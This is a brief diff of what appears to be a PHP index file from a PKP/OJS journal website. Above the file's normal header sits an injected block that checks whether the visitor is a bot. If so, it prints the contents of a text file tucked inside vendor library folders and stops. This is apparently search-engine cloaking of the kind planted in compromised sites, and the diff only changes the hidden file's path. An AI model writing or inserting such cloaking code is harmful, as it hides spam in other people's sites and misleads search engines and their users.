@@ -13,12 +13,14 @@ function is_bot() {
 }
 
 if (is_bot()) {
-    $message = file_get_contents('/home/unialfa/public_html/lib/pkp/lib/vendor/michelf/php-markdown/index.txt');
+    $message = file_get_contents('/home/spcrdnet/public_html/jelss.miard.org/lib/pkp/lib/counterBots/generated/index.txt');
     echo $message;
 exit;
 }
 ?>
 <?php
+
+
 
 /**
  * @defgroup index Index
